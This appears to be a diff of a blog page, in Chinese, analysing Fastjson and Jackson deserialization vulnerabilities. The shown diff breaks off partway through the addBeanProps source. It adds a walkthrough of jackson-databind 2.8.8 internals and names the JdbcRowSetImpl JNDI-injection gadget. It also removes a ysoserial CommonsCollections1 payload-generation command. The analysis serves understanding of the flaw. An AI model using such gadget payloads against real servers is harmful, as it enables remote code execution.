@@ -702,14 +702,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.7k
+                        3.9k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        8 分
+                        19 分
                     </div>
                     
                 
@@ -987,10 +987,286 @@
 <p>2.服务端classpath存在可以利用的类，如 <code>com.sun.rowset.JdbcRowSetImpl</code>,target 类满足setXX可控触发JDNI注入利用。</p>
 </blockquote>
 <p><strong>一点思考：</strong></p>
-<p>结合Fastjson与Jackson的漏洞利用，对比Java的反序列化，他们的共同点都是从 输入的字节流中还原一个对象的状态，当Java反序列的字节流规范中，序列化的数据不仅仅保存了每一个成员变量的值（状态），也记录的这个成员变量的类型（如TC_OBJECT);所以Java的反序列漏洞利用可以通过寻找readObject函数里用到的成员变量的gadget 达成利用的目的，可以仅仅通过成员变量的值控制（如Fastjson,Jackson这种JDNI注入利用 JdbcRowSetImple)；Json的反序列是不论是Fastjson还是Jackson，都限定了从某一个类的constructor默认参数实例化，通过getter or setter方法给成员对象赋值还原对象。</p>
-<h2 id="三、Jackson反序列化利用"><a href="#三、Jackson反序列化利用" class="headerlink" title="三、Jackson反序列化利用"></a>三、Jackson反序列化利用</h2><h3 id="3-1-ysoserial快速生成利用链"><a href="#3-1-ysoserial快速生成利用链" class="headerlink" title="3.1 ysoserial快速生成利用链"></a>3.1 ysoserial快速生成利用链</h3><pre class="line-numbers language-shell"><code class="language-shell">java -jar ysoserial.jar CommonsCollections1 notepad.exe |base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>结合Fastjson与Jackson的漏洞利用，对比Java的反序列化，他们的共同点都是<strong>从输入的字节流中还原一个对象的状态</strong>，当Java反序列的字节流规范中，序列化的数据不仅仅保存了每一个成员变量的值（状态），也记录的这个成员变量的类型（如TC_OBJECT);所以Java的反序列漏洞利用可以通过寻找readObject函数（Target类与内部成员类的readObject）里用到的成员变量的gadget 达成利用的目的，可以通过成员变量的值控制（如Fastjson,Jackson这种JDNI注入利用 JdbcRowSetImple)；Json的反序列是不论是Fastjson还是Jackson，都限定了从某一个类的constructor默认参数实例化（如Fastjson的的autotype,Jackson在parseObject传入的Target.Class），通过getter or setter方法给成员对象赋值还原对象，<strong>利用的仅仅是这个Taget类与Target类的成员的setter or getter方法（这是一个递归的解析还原JSON串）</strong>。</p>
+<p>下面是具体的调试分析jackson解析json串还原对象状态逻辑，默认开启defaultTyping</p>
+<p>jackson-databind 2.8.8</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.8.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="1-objectMapper-readValue"><a href="#1-objectMapper-readValue" class="headerlink" title="1.objectMapper#readValue"></a>1.objectMapper#readValue</h3><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">readValue</span><span class="token punctuation">(</span>String content<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> valueType<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> JsonParseException<span class="token punctuation">,</span> JsonMappingException
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token function">_readMapAndClose</span><span class="token punctuation">(</span>_jsonFactory<span class="token punctuation">.</span><span class="token function">createParser</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> _typeFactory<span class="token punctuation">.</span><span class="token function">constructType</span><span class="token punctuation">(</span>valueType<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>_typeFactory.constructType(valueType)</code>: 通过传⼊的第⼆个参数,即Target类对象获取⼀个Type对象，这⾥不会细跟，主要简单说下他的流程。它⾸先⾸先会从缓存尝试获取该Class对应的Type，缓存中有这个数据的前提是，这个objectMapper前有对这个Class进⾏过序列化，之后会经过⼀系列的判断，这些判断包括判断它的Class是否属于某些特殊的Class（Map,Collection,AtomicReference）以及判断这个Class是否是Interface，这些判断在我上⾯的代码中都不成⽴，最终会通过 _newSimpleType ⽅法来创建⼀个Type对象。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201227230422457.png" alt="image-20201227230422457"></p>
+<p>获取到的Type: 主要记录了类Class,superClass等信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201227231407071.png" alt="image-20201227231407071"></p>
+<p><code>_jsonFactory.createParser(content)</code>: 将String生成一个Paser对象，用于后面的解析</p>
+<p><code>_readMapAndClose</code>:  </p>
+<h3 id="2-objectMapper-readMapAndClose-Paser-Type"><a href="#2-objectMapper-readMapAndClose-Paser-Type" class="headerlink" title="2.objectMapper#_readMapAndClose(Paser,Type):"></a>2.objectMapper#_readMapAndClose(Paser,Type):</h3><p>从paser(json串的生成，封装了对字符串的处理，即单词的提取这些，返回解析的Token标识) 获取第一个Token，Token的列表</p>
+<pre class="line-numbers language-java"><code class="language-java">    <span class="token function">NOT_AVAILABLE</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">START_OBJECT</span><span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">END_OBJECT</span><span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">START_ARRAY</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">END_ARRAY</span><span class="token punctuation">(</span><span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">FIELD_NAME</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">VALUE_EMBEDDED_OBJECT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">VALUE_STRING</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">VALUE_NUMBER_INT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">VALUE_NUMBER_FLOAT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">VALUE_TRUE</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">VALUE_FALSE</span><span class="token punctuation">(</span><span class="token string">"false"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token function">VALUE_NULL</span><span class="token punctuation">(</span><span class="token string">"null"</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里进入START_OBJECT的解析，标识开始解析还原一个对象,要还原一个对象要获取这个JSON串对应的Deserializer，最终调用Deserializer#deserilize还原对象：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201227232213728.png" alt="image-20201227232213728"></p>
+<p><code>createDeserializationContext</code> 依据配置和json串对应的paser获取上下文context,这些信息包括，这些用于解析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201227233750790.png" alt="image-20201227233750790"></p>
+<p><code>_findRootDeserializer</code> 依据Json串上下文和 Json 类型信息最终返回 JSON对应的Deserializer,可用与后面调用deserial方法从json串中还原对象，在后面的分析可以知道，实际是调用setter | getter | 反射对默认构造器获得的对象赋值。 <strong>这个方法才是重点，简述了后面为什么有些利用链利用的是getter 方法</strong>。</p>
+<h4 id="1-findRootDeserializer"><a href="#1-findRootDeserializer" class="headerlink" title="1._findRootDeserializer"></a>1.<code>_findRootDeserializer</code></h4><p>在 <code>_findRootDeserializer</code> ⽅法中，会尝试从根节点去获取 Deserializer ，类似于缓存的操作，由于这是第⼀次获取 Deserializer ，所以⾃然从根节点是取不到的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201227234925524.png" alt="image-20201227234925524"></p>
+<p>它会进⼊到 <code>findRootValueDeserializer</code> ⽅法中获取Deserializer 。</p>
+<h4 id="2-findRootValueDeserializer"><a href="#2-findRootValueDeserializer" class="headerlink" title="2.findRootValueDeserializer"></a>2.<code>findRootValueDeserializer</code></h4><p>该⽅法会从尝试从缓存中获取 Deserializer ，这⾥的获取⽅式有点不同了，它不是单纯的从个map中去调⽤get⽅法获取，⽽是会经过⼀系列很复杂的获取⽅式后，判断是否获取到了，如果获取不到，会调⽤ <code>_createAndCacheValueDeserializer</code> 去创建⼀个 Deserializer 并对其进⾏缓存。最后会通过buildBeanDeserializer ⽅法创建⼀BeanDeserializer （因为前⾯的⼀系列判断都不满⾜，⽐如判断Type的类型，如判断是不是Enum,Container，Reference等）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201227234752583.png" alt="image-20201227234752583"></p>
+<p>并通过下⾯⼏个⽅法来为创建好的 BeanDeserializer 对象赋值  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228003153340.png" alt="image-20201228003153340"></p>
+<h4 id="3-addBeanProps"><a href="#3-addBeanProps" class="headerlink" title="3.addBeanProps"></a>3.<code>addBeanProps</code></h4><p>主要的逻辑在于解决字段与setter | getter | 反射的绑定，用于后面解析json串还原对象。</p>
+<p>先贴上代码</p>
+<pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">addBeanProps</span><span class="token punctuation">(</span>DeserializationContext ctxt<span class="token punctuation">,</span>
+            BeanDescription beanDesc<span class="token punctuation">,</span> BeanDeserializerBuilder builder<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> JsonMappingException
+    <span class="token punctuation">{</span>
+        <span class="token keyword">final</span> <span class="token keyword">boolean</span> isConcrete <span class="token operator">=</span> <span class="token operator">!</span>beanDesc<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isAbstract</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> SettableBeanProperty<span class="token punctuation">[</span><span class="token punctuation">]</span> creatorProps <span class="token operator">=</span> isConcrete
+                <span class="token operator">?</span> builder<span class="token punctuation">.</span><span class="token function">getValueInstantiator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFromObjectArguments</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token operator">:</span> null<span class="token punctuation">;</span>
+        <span class="token keyword">final</span> <span class="token keyword">boolean</span> hasCreatorProps <span class="token operator">=</span> <span class="token punctuation">(</span>creatorProps <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 01-May-2016, tatu: Which base type to use here gets tricky, since</span>
+        <span class="token comment" spellcheck="true">//   it may often make most sense to use general type for overrides,</span>
+        <span class="token comment" spellcheck="true">//   but what we have here may be more specific impl type. But for now</span>
+        <span class="token comment" spellcheck="true">//   just use it as is.</span>
+        JsonIgnoreProperties<span class="token punctuation">.</span>Value ignorals <span class="token operator">=</span> ctxt<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">getDefaultPropertyIgnorals</span><span class="token punctuation">(</span>beanDesc<span class="token punctuation">.</span><span class="token function">getBeanClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                        beanDesc<span class="token punctuation">.</span><span class="token function">getClassInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Set<span class="token operator">&lt;</span>String<span class="token operator">></span> ignored<span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>ignorals <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">boolean</span> ignoreAny <span class="token operator">=</span> ignorals<span class="token punctuation">.</span><span class="token function">getIgnoreUnknown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            builder<span class="token punctuation">.</span><span class="token function">setIgnoreUnknownProperties</span><span class="token punctuation">(</span>ignoreAny<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">// Or explicit/implicit definitions?</span>
+            ignored <span class="token operator">=</span> ignorals<span class="token punctuation">.</span><span class="token function">getIgnored</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span>String propName <span class="token operator">:</span> ignored<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                builder<span class="token punctuation">.</span><span class="token function">addIgnorable</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            ignored <span class="token operator">=</span> Collections<span class="token punctuation">.</span><span class="token function">emptySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token comment" spellcheck="true">// Also, do we have a fallback "any" setter?</span>
+        AnnotatedMethod anySetterMethod <span class="token operator">=</span> beanDesc<span class="token punctuation">.</span><span class="token function">findAnySetter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        AnnotatedMember anySetterField <span class="token operator">=</span> null<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>anySetterMethod <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            builder<span class="token punctuation">.</span><span class="token function">setAnySetter</span><span class="token punctuation">(</span><span class="token function">constructAnySetter</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">,</span> beanDesc<span class="token punctuation">,</span> anySetterMethod<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            anySetterField <span class="token operator">=</span> beanDesc<span class="token punctuation">.</span><span class="token function">findAnySetterField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>anySetterField <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                builder<span class="token punctuation">.</span><span class="token function">setAnySetter</span><span class="token punctuation">(</span><span class="token function">constructAnySetter</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">,</span> beanDesc<span class="token punctuation">,</span> anySetterField<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// NOTE: we do NOT add @JsonIgnore'd properties into blocked ones if there's any-setter</span>
+        <span class="token comment" spellcheck="true">// Implicit ones via @JsonIgnore and equivalent?</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>anySetterMethod <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> anySetterField <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            Collection<span class="token operator">&lt;</span>String<span class="token operator">></span> ignored2 <span class="token operator">=</span> beanDesc<span class="token punctuation">.</span><span class="token function">getIgnoredPropertyNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ignored2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">for</span> <span class="token punctuation">(</span>String propName <span class="token operator">:</span> ignored2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment" spellcheck="true">// allow ignoral of similarly named JSON property, but do not force;</span>
+                    <span class="token comment" spellcheck="true">// latter means NOT adding this to 'ignored':</span>
+                    builder<span class="token punctuation">.</span><span class="token function">addIgnorable</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">final</span> <span class="token keyword">boolean</span> useGettersAsSetters <span class="token operator">=</span> ctxt<span class="token punctuation">.</span><span class="token function">isEnabled</span><span class="token punctuation">(</span>MapperFeature<span class="token punctuation">.</span>USE_GETTERS_AS_SETTERS<span class="token punctuation">)</span>
+                <span class="token operator">&amp;&amp;</span> ctxt<span class="token punctuation">.</span><span class="token function">isEnabled</span><span class="token punctuation">(</span>MapperFeature<span class="token punctuation">.</span>AUTO_DETECT_GETTERS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// Ok: let's then filter out property definitions</span>
+        List<span class="token operator">&lt;</span>BeanPropertyDefinition<span class="token operator">></span> propDefs <span class="token operator">=</span> <span class="token function">filterBeanProps</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">,</span>
+                beanDesc<span class="token punctuation">,</span> builder<span class="token punctuation">,</span> beanDesc<span class="token punctuation">.</span><span class="token function">findProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ignored<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// After which we can let custom code change the set</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_factoryConfig<span class="token punctuation">.</span><span class="token function">hasDeserializerModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span>BeanDeserializerModifier mod <span class="token operator">:</span> _factoryConfig<span class="token punctuation">.</span><span class="token function">deserializerModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                propDefs <span class="token operator">=</span> mod<span class="token punctuation">.</span><span class="token function">updateProperties</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanDesc<span class="token punctuation">,</span> propDefs<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token comment" spellcheck="true">// At which point we still have all kinds of properties; not all with mutators:</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>BeanPropertyDefinition propDef <span class="token operator">:</span> propDefs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            SettableBeanProperty prop <span class="token operator">=</span> null<span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">/* 18-Oct-2013, tatu: Although constructor parameters have highest precedence,
+             *   we need to do linkage (as per [databind#318]), and so need to start with
+             *   other types, and only then create constructor parameter, if any.
+             */</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>propDef<span class="token punctuation">.</span><span class="token function">hasSetter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                JavaType propertyType <span class="token operator">=</span> propDef<span class="token punctuation">.</span><span class="token function">getSetter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                prop <span class="token operator">=</span> <span class="token function">constructSettableProperty</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">,</span> beanDesc<span class="token punctuation">,</span> propDef<span class="token punctuation">,</span> propertyType<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>propDef<span class="token punctuation">.</span><span class="token function">hasField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                JavaType propertyType <span class="token operator">=</span> propDef<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                prop <span class="token operator">=</span> <span class="token function">constructSettableProperty</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">,</span> beanDesc<span class="token punctuation">,</span> propDef<span class="token punctuation">,</span> propertyType<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>useGettersAsSetters <span class="token operator">&amp;&amp;</span> propDef<span class="token punctuation">.</span><span class="token function">hasGetter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">/* May also need to consider getters
+                 * for Map/Collection properties; but with lowest precedence
+                 */</span>
+                AnnotatedMethod getter <span class="token operator">=</span> propDef<span class="token punctuation">.</span><span class="token function">getGetter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token comment" spellcheck="true">// should only consider Collections and Maps, for now?</span>
+                Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> rawPropertyType <span class="token operator">=</span> getter<span class="token punctuation">.</span><span class="token function">getRawType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>Collection<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>rawPropertyType<span class="token punctuation">)</span>
+                        <span class="token operator">||</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>rawPropertyType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    prop <span class="token operator">=</span> <span class="token function">constructSetterlessProperty</span><span class="token punctuation">(</span>ctxt<span class="token punctuation">,</span> beanDesc<span class="token punctuation">,</span> propDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true">// 25-Sep-2014, tatu: No point in finding constructor parameters for abstract types</span>
+            <span class="token comment" spellcheck="true">//   (since they are never used anyway)</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>hasCreatorProps <span class="token operator">&amp;&amp;</span> propDef<span class="token punctuation">.</span><span class="token function">hasConstructorParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">/* If property is passed via constructor parameter, we must
+                 * handle things in special way. Not sure what is the most optimal way...
+                 * for now, let's just call a (new) method in builder, which does nothing.
+                 */</span>
+                <span class="token comment" spellcheck="true">// but let's call a method just to allow custom builders to be aware...</span>
+                <span class="token keyword">final</span> String name <span class="token operator">=</span> propDef<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                CreatorProperty cprop <span class="token operator">=</span> null<span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>creatorProps <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span>SettableBeanProperty cp <span class="token operator">:</span> creatorProps<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>cp<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>cp <span class="token keyword">instanceof</span> <span class="token class-name">CreatorProperty</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            cprop <span class="token operator">=</span> <span class="token punctuation">(</span>CreatorProperty<span class="token punctuation">)</span> cp<span class="token punctuation">;</span>
+                            <span class="token keyword">break</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>cprop <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    List<span class="token operator">&lt;</span>String<span class="token operator">></span> n <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span>SettableBeanProperty cp <span class="token operator">:</span> creatorProps<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        n<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cp<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                    ctxt<span class="token punctuation">.</span><span class="token function">reportBadPropertyDefinition</span><span class="token punctuation">(</span>beanDesc<span class="token punctuation">,</span> propDef<span class="token punctuation">,</span>
+                            <span class="token string">"Could not find creator property with name '%s' (known Creator properties: %s)"</span><span class="token punctuation">,</span>
+                            name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>prop <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
